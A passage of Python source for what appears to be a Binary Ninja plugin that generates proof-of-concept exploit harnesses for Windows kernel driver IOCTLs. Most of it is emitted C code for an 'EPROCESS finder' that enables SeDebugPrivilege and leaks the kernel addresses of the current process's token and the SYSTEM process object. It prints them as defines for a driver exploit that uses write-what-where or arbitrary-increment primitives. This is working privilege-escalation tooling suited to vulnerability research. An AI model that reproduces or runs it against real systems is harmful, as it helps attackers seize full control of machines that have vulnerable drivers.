    a('            "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion",')
    a('            0, KEY_READ, &hk) == 0) {')
    a('        RegQueryValueExA(hk, "CurrentBuildNumber", NULL, NULL, (LPBYTE)buf, &sz);')
    a('        RegCloseKey(hk);')
    a('        build = (DWORD)atoi(buf);')
    a('    }')
    a('    for (int i = 0; g_off_table[i].build != 0; i++)')
    a('        if (g_off_table[i].build == build) return &g_off_table[i];')
    a('    printf("[!] Build %lu not in table -- using fallback. VERIFY WITH WINDBG.\\n", build);')
    a('    return &g_off_table[sizeof(g_off_table)/sizeof(g_off_table[0]) - 1];')
    a('}')
    a('')
    a('/* -----------------------------------------------------------------------')
    a(' * Enable SeDebugPrivilege so OpenProcess(PID 4) succeeds when running as admin')
    a(' * --------------------------------------------------------------------- */')
    a('static void enable_sedebug(void) {')
    a('    HANDLE hTok; TOKEN_PRIVILEGES tp = {0};')
    a('    if (!OpenProcessToken(GetCurrentProcess(),')
    a('            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok)) return;')
    a('    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid);')
    a('    tp.PrivilegeCount = 1;')
    a('    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;')
    a('    AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL);')
    a('    CloseHandle(hTok);')
    a('}')
    a('')
    a('/* -----------------------------------------------------------------------')
    a(' * Main')
    a(' * --------------------------------------------------------------------- */')
    a('int main(void) {')
    a('    g_NtQSI = (pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),')
    a('                                        "NtQuerySystemInformation");')
    a('    enable_sedebug();')
    a('    printf("=== EPROCESS Finder -- ' + driver_name + ' ===\\n\\n");')
    a('')
    a('    const OFFSETS *off = detect_offsets();')
    a('    char bld_buf[16] = {0}; DWORD bld_sz = sizeof(bld_buf), build = 0; HKEY bk;')
    a('    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,')
    a('            "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion",')
    a('            0, KEY_READ, &bk) == 0) {')
    a('        RegQueryValueExA(bk, "CurrentBuildNumber", NULL, NULL, (LPBYTE)bld_buf, &bld_sz);')
    a('        RegCloseKey(bk); build = (DWORD)atoi(bld_buf);')
    a('    }')
    a('    printf("[*] OS build:  %lu\\n", build);')
    a('    printf("[*] Offsets -- EPROCESS.UniqueProcessId=+0x%X  .ActiveProcessLinks=+0x%X  .Token=+0x%X\\n",')
    a('           off->pid, off->links, off->token);')
    a('    printf("[*]            TOKEN.Privileges.Present=+0x%X  .Enabled=+0x%X  .EnabledByDefault=+0x%X\\n\\n",')
    a('           off->priv, off->priv + 8, off->priv + 16);')
    a('')
    a('    ULONG_PTR pid = (ULONG_PTR)GetCurrentProcessId();')
    a('')
    a('    /* Open handles BEFORE snapshot so they appear in the table */')
    a('    HANDLE hSelf = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pid);')
    a('    HANDLE hTok  = NULL;')
    a('    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok);')
    a('    HANDLE hSys  = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 4);')
    a('')
    a('    SYS_HANDLE_INFO_EX *hi = query_all_handles();')
    a('    if (!hi) { puts("[!] NtQuerySystemInformation failed"); return 1; }')
    a('')
    a('    ULONG_PTR own_eprocess = handle_to_kva(hi, pid, hSelf);')
    a('    CloseHandle(hSelf);')
    a('    ULONG_PTR own_token = handle_to_kva(hi, pid, hTok);')
    a('    CloseHandle(hTok);')
    a('')
    a('    printf("[*] Own PID:             %llu\\n",  (unsigned long long)pid);')
    a('    printf("[*] Own EPROCESS:        0x%llx\\n", (unsigned long long)own_eprocess);')
    a('    printf("[*] Own TOKEN:           0x%llx\\n", (unsigned long long)own_token);')
    a('    printf("[*] EPROCESS.Token @:    0x%llx\\n",')
    a('           (unsigned long long)(own_eprocess + off->token));')
    a('    printf("[*] TOKEN.Priv.Present@: 0x%llx\\n\\n",')
    a('           (unsigned long long)(own_token + off->priv));')
    a('')
    a('    /* SYSTEM EPROCESS: hSys is a handle in OUR table pointing at PID 4 EPROCESS */')
    a('    ULONG_PTR system_eprocess = 0;')
    a('    if (hSys) {')
    a('        system_eprocess = handle_to_kva(hi, pid, hSys);')
    a('        CloseHandle(hSys);')
    a('    }')
    a('')
    a('    /* ntoskrnl base + PsInitialSystemProcess KVA */')
    a('    char disk_path[MAX_PATH];')
    a('    ULONG_PTR kbase = get_ntoskrnl_base(disk_path, sizeof(disk_path));')
    a('    ULONG_PTR psis_kva = 0;')
    a('    HMODULE hMod = LoadLibraryExA(disk_path, NULL, DONT_RESOLVE_DLL_REFERENCES);')
    a('    if (hMod) {')
    a('        ULONG_PTR uva = (ULONG_PTR)GetProcAddress(hMod, "PsInitialSystemProcess");')
    a('        if (uva) psis_kva = kbase + (uva - (ULONG_PTR)hMod);')
    a('        FreeLibrary(hMod);')
    a('    }')
    a('    printf("[*] ntoskrnl base:              0x%llx\\n", (unsigned long long)kbase);')
    a('    printf("[*] PsInitialSystemProcess KVA: 0x%llx\\n", (unsigned long long)psis_kva);')
    a('    if (system_eprocess)')
    a('        printf("[*] SYSTEM EPROCESS:            0x%llx\\n\\n", (unsigned long long)system_eprocess);')
    a('    else {')
    a('        printf("[!] SYSTEM EPROCESS: PID 4 open failed (err=%lu)\\n", GetLastError());')
    a('        printf("    WinDbg: poi(0x%llx)\\n\\n", (unsigned long long)psis_kva);')
    a('    }')
    a('')
    a('    /* ---- Copy-paste block ---- */')
    a('    printf("=== Copy-paste into ' + driver_name + r'''-poc.c ===\n");''')
    a('    printf("#define OWN_EPROCESS       0x%llxULL\\n", (unsigned long long)own_eprocess);')
    a('    printf("#define OWN_TOKEN_KVA      0x%llxULL\\n", (unsigned long long)own_token);')
    a('    printf("#define PSIS_KVA           0x%llxULL\\n", (unsigned long long)psis_kva);')
    a('    if (system_eprocess)')
    a('        printf("#define SYSTEM_EPROCESS    0x%llxULL\\n", (unsigned long long)system_eprocess);')
    a('    else')
    a('        printf("#define SYSTEM_EPROCESS    0x0ULL  /* run as admin to populate */\\n");')
    a('    printf("#define OFF_EPROCESS_TOKEN 0x%X\\n", off->token);')
    a('    printf("#define OFF_TOKEN_PRIV     0x%X\\n", off->priv);')
    a('    printf("/* Verify: dt nt!_EPROCESS Token  &&  dt nt!_TOKEN Privileges */\\n");')
    a('    printf("=======================================\\n");')
    a('')
    a('    free(hi);')
    a('    puts("\\nPress Enter to exit...");')
    a('    (void)getchar();')
    a('    return 0;')
    a('}')

    return "\n".join(L) + "\n"


# ---------------------------------------------------------------------------
# Main entry
# ---------------------------------------------------------------------------

def _guess_sizes(text, method):
    """Crude buffer-size heuristic. METHOD_NEITHER uses raw pointers, BUFFERED uses SystemBuffer."""
    in_sz, out_sz = 0x100, 0x100
    # Larger default if any sizeof(<struct>) clues - we don't parse them, just pad.
    if 'OutputBufferLength' in text:
        out_sz = 0x400
    if 'InputBufferLength' in text:
        in_sz = 0x400
    if method == 'METHOD_NEITHER':
        in_sz = max(in_sz, 0x200)
        out_sz = max(out_sz, 0x200)
    return in_sz, out_sz


def generate_poc(bv: BinaryView):
    drv = os.path.splitext(os.path.basename(bv.file.filename))[0]
    out_dir = os.path.join(os.path.expanduser('~'), '.logs', 'WinDriverPOCs')
    os.makedirs(out_dir, exist_ok=True)
    c_path  = os.path.join(out_dir, drv + '-poc.c')
    py_path = os.path.join(out_dir, drv + '-poc.py')

    device = _detect_device(bv)
    device_path = _user_device_path(device)
    log_info("[poc] Device candidate: {} -> {}".format(device, device_path))

    dispatchers = _find_dispatch_routines(bv)
    if not dispatchers:
        log_warn("[poc] No dispatcher found; emitting empty harness.")

    entries = []
    seen = set()
    idx = 0
    for df in dispatchers:
        branches = _ioctl_branches_for_dispatcher(df)
        by_code = {}
        for code, instrs, _addr in branches:
            by_code.setdefault(code, []).extend(instrs)
        for code, instrs in sorted(by_code.items()):
            if code in seen:
                continue
            seen.add(code)
            text = _deep_text(bv, instrs, max_depth=3)
            tags = _classify(text, bv=bv, instrs=instrs)
            d = _ctl_decode(code)
            method = METHOD_MAP.get(d['method'], str(d['method']))
            in_sz, out_sz = _guess_sizes(text, method)
            entries.append((idx, code, method, tags, in_sz, out_sz))
            idx += 1

    if not entries:
        entries.append((0, 0xDEADBEEF, 'METHOD_BUFFERED', [], 0x100, 0x100))

    www_code  = next((code for _i, code, _m, tags, _is, _os in entries if 'write_what_where' in tags), 0)
    ainc_code = next((code for _i, code, _m, tags, _is, _os in entries if 'arb_increment'    in tags), 0)

    outputs = [
        (c_path,  _emit_c(drv, device_path, entries),                              'C POC'),
        (py_path, _emit_py(drv, device_path, entries),                             'Python POC'),
        (os.path.join(out_dir, drv + '-eprocess-finder.c'),
         _emit_eprocess_finder_c(drv, device_path, www_code, ainc_code),           'EPROCESS finder'),
    ]
    for path, content, label in outputs:
        try:
            with open(path, 'w') as f:
                f.write(content)
            log_info("[poc] wrote {}: {}".format(label, path))
        except Exception as e:
            log_warn("[poc] {} write failed: {}".format(label, e))

    log_info("[poc] Generated {} IOCTL stubs for {} (device {})".format(
        len(entries), drv, device_path))


PluginCommand.register(
    "Windows Driver Analysis\\Generate POC (C + Python)",
    "Emit C + Python ctypes POC scaffolding for discovered IOCTLs",
    generate_poc,
)
